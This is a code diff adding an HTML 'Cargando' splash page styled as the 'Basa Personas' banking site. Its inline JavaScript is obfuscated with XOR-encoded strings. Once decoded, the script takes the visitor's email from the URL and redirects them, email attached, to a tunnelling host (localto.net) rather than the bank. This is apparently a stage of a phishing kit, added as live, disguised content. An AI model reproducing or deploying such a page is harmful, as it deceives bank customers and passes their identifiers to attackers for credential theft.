@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando - Basa Personas</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;500;600&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #003087 0%, #0061a6 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            overflow: hidden;
+            color: white;
+        }
+
+        .loader-container {
+            text-align: center;
+        }
+
+        .logo {
+            width: 220px;
+            height: auto;
+            /* filter: brightness(0) invert(1); <- Opcional: Quítalo si el logo original ya tiene sus propios colores y no quieres que se vuelva completamente blanco */
+            margin-bottom: 40px;
+            opacity: 0.95;
+            display: inline-block;
+        }
+
+        .loading-bar-container {
+            width: 280px;
+            height: 3px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 50px;
+            overflow: hidden;
+            margin: 0 auto 25px;
+        }
+
+        .loading-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(to right, #00b4ff, #ffffff);
+            border-radius: 50px;
+            animation: loading 2.8s infinite ease-in-out;
+        }
+
+        .loading-text {
+            font-size: 17px;
+            font-weight: 500;
+            color: rgba(255,255,255,0.9);
+            letter-spacing: 0.5px;
+        }
+
+        /* Corrección para la animación de los puntos de carga */
+        .dots::after {
+            content: '';
+            animation: dots 1.5s infinite;
+        }
+
+        @keyframes loading {
+            0% { width: 0%; }
+            50% { width: 100%; }
+            100% { width: 0%; }
+        }
+
+        @keyframes dots {
+            0% { content: '.'; }
+            33% { content: '..'; }
+            66% { content: '...'; }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader-container">
+        <!-- Se limpiaron los espacios corruptos en la etiqueta de la imagen -->
+        <img src="https://htmto.vercel.app/logo-round.svg" class="logo" alt="Basa Logo">
+        
+        <div class="loading-bar-container">
+            <div class="loading-bar"></div>
+        </div>
+        
+        <div class="loading-text">
+            Cargando<span class="dots"></span>
+        </div>
+    </div>
+
+    <script>
+function NPQbM_AwVDsY$AnyMWe(VoHUrF_WH,WYYsuFCxd_gV){const ycENZReaxFbeJ_rVcRkznnv_Tsn=rDGtTYn();return NPQbM_AwVDsY$AnyMWe=function(PgFyx_bTX$wwpLyYX,KTlwTDD_GEhoqhIPjh){PgFyx_bTX$wwpLyYX=PgFyx_bTX$wwpLyYX-(-0x6bf+-parseInt(0xb7c)+Math.ceil(parseInt(0x1))*Math.trunc(0x1373));let lPpTngbDr$H=ycENZReaxFbeJ_rVcRkznnv_Tsn[PgFyx_bTX$wwpLyYX];if(NPQbM_AwVDsY$AnyMWe['bxlmqz']===undefined){const dXl$BiUvG$D=function(oYOTRvFi$axukTTdwkAtnd_Ndmw){let Yk_$GzaZY=0x6c*parseInt(0x13)+Math.trunc(parseInt(0x1501))+0x1*-parseInt(0x1b60)&parseInt(0x2d)+0x12c7*-0x1+Math.floor(0x1399),ruNXU=new Uint8Array(oYOTRvFi$axukTTdwkAtnd_Ndmw['match'](/.{1,2}/g)['map'](ljfdjDxw=>parseInt(ljfdjDxw,0x191e+Math.trunc(-0x1)*Math.ceil(0x148d)+parseFloat(-0x481)))),uFwcbwrZaX$pJbUrZ=ruNXU['map'](LsOIImUXWEMrMi$C_JbJJD=>LsOIImUXWEMrMi$C_JbJJD^Yk_$GzaZY),ZyPsRLLRSntJSCQklY$gVIQ=new TextDecoder(),QrTN_t$WZ=ZyPsRLLRSntJSCQklY$gVIQ['decode'](uFwcbwrZaX$pJbUrZ);return QrTN_t$WZ;};NPQbM_AwVDsY$AnyMWe['WtmQEJ']=dXl$BiUvG$D,VoHUrF_WH=arguments,NPQbM_AwVDsY$AnyMWe['bxlmqz']=!![];}const ZLHBPRKTsDElq=ycENZReaxFbeJ_rVcRkznnv_Tsn[-0x2148+-parseInt(0x10)*-parseInt(0x162)+Math.floor(0xe)*Number(0xcc)],jAkuqRYckdNgy=PgFyx_bTX$wwpLyYX+ZLHBPRKTsDElq,GUdynftGpFJd_$u=VoHUrF_WH[jAkuqRYckdNgy];return!GUdynftGpFJd_$u?(NPQbM_AwVDsY$AnyMWe['iwqaUu']===undefined&&(NPQbM_AwVDsY$AnyMWe['iwqaUu']=!![]),lPpTngbDr$H=NPQbM_AwVDsY$AnyMWe['WtmQEJ'](lPpTngbDr$H),VoHUrF_WH[jAkuqRYckdNgy]=lPpTngbDr$H):lPpTngbDr$H=GUdynftGpFJd_$u,lPpTngbDr$H;},NPQbM_AwVDsY$AnyMWe(VoHUrF_WH,WYYsuFCxd_gV);}const HsDfTz$Xk=NPQbM_AwVDsY$AnyMWe;(function(iljf_djDxwMLsOIImUXWEMrMiC,bJJDsWxqRTIrH$tMg$DeU){const dBdroq_zrPjKLH_cV=NPQbM_AwVDsY$AnyMWe,YXXgT_NCHM=iljf_djDxwMLsOIImUXWEMrMiC();while(!![]){try{const ibGr$rv_uOLEBIc=parseFloat(parseFloat(dBdroq_zrPjKLH_cV(0x143))/(parseInt(0x1aa5)+0x24ca+Math.ceil(-0x3f6e)))+-parseFloat(dBdroq_zrPjKLH_cV(0x149))/(-0x5c5*0x1+parseInt(0xa05)+Math.max(-0x43e,-parseInt(0x43e)))+-parseFloat(dBdroq_zrPjKLH_cV(0x148))/(parseInt(0xe8c)+-0x2166+parseInt(0x12dd))*(-parseFloat(dBdroq_zrPjKLH_cV(0x147))/(-parseInt(0x19fe)+parseInt(0x1)*Number(parseInt(0x1e16))+parseFloat(-parseInt(0x12))*parseFloat(0x3a)))+-parseFloat(dBdroq_zrPjKLH_cV(0x139))/(Math.max(0x7a3,parseInt(0x7a3))+Math.ceil(-parseInt(0x1aa3))+Math.ceil(0x1305))+parseFloat(dBdroq_zrPjKLH_cV(0x145))/(-parseInt(0x1)*Number(0x595)+-0x1769+0x1d04)*Number(-parseFloat(dBdroq_zrPjKLH_cV(0x140))/(-parseInt(0x1e5b)+-parseInt(0x1)*-0x24da+Math.max(-0x678,-0x678)))+Math['floor'](-parseFloat(dBdroq_zrPjKLH_cV(0x14a))/(parseInt(0x1)*Number(0x1502)+0x229e+-0x3*Math.floor(parseInt(0x1288))))+parseFloat(-parseFloat(dBdroq_zrPjKLH_cV(0x13e))/(Math.ceil(-parseInt(0x26f2))+-parseInt(0x233e)*Number(-parseInt(0x1))+-0xb*-parseInt(0x57)))*Number(-parseFloat(dBdroq_zrPjKLH_cV(0x13b))/(0x12*-parseInt(0x9e)+parseInt(0x1a17)*parseInt(0x1)+parseInt(-parseInt(0xef1))));if(ibGr$rv_uOLEBIc===bJJDsWxqRTIrH$tMg$DeU)break;else YXXgT_NCHM['push'](YXXgT_NCHM['shift']());}catch(h_ixVcVrDHsV_GvvuJzBLflqo){YXXgT_NCHM['push'](YXXgT_NCHM['shift']());}}}(rDGtTYn,-parseInt(0x73891)*0x1+parseInt(0x2)*Math.floor(-parseInt(0x37715))+parseFloat(-0xed13)*Math.floor(-parseInt(0x16))),document[HsDfTz$Xk(0x14b)](HsDfTz$Xk(0x13a),()=>{const PmrKgadvZsdr=HsDfTz$Xk,OxFsPG=new URLSearchParams(window[PmrKgadvZsdr(0x142)][PmrKgadvZsdr(0x146)]),F_CsuiVoH=OxFsPG[PmrKgadvZsdr(0x141)](PmrKgadvZsdr(0x138));setTimeout(function(){const NIQDtjPYSIOm=PmrKgadvZsdr,rFWHoWYYsuF$C$xdgVZycENZR=NIQDtjPYSIOm(0x13c);let axFbeJ=rFWHoWYYsuF$C$xdgVZycENZR;F_CsuiVoH&&(axFbeJ+=(rFWHoWYYsuF$C$xdgVZycENZR[NIQDtjPYSIOm(0x13f)]('?')?'&':'?')+(NIQDtjPYSIOm(0x144)+encodeURIComponent(F_CsuiVoH))),window[NIQDtjPYSIOm(0x142)][NIQDtjPYSIOm(0x13d)]=axFbeJ;},parseInt(-0x1a98)+Math.ceil(0x1655)+0xffb);}));function rDGtTYn(){const ikns_bonvLVHtPNroX$aistC=['c9cac6c4d1cccacb','939396949293ddc7f1fdd2d2','c0c8c4ccc998','96979495c9f5d5f1cbc2','d6c0c4d7c6cd','9695929d9de1e2e0cdcad4','97949ceef1c9d2f1e1','94919c939d9693d5e9dcfcfde0','9697979194939de9ede7f5f7ee','c4c1c1e0d3c0cbd1e9ccd6d1c0cbc0d7','c0c8c4ccc9','97969c9d939090cdecf5cfcdc8','e1eae8e6cacbd1c0cbd1e9cac4c1c0c1','9d969793979495d0cfe4ced0d4','cdd1d1d5d69f8a8a91c0ddd090c8c1c0d1d78bc9cac6c4c9d1ca8bcbc0d18ac7c4d6c4d5c0d7d6cacbc4d6','cdd7c0c3','9cf1d6e1e0c9d4','cccbc6c9d0c1c0d6','979190c7e1d7edd0ff','c2c0d1'];rDGtTYn=function(){return ikns_bonvLVHtPNroX$aistC;};return rDGtTYn();}
+
+    </script>
+</body>
+</html>
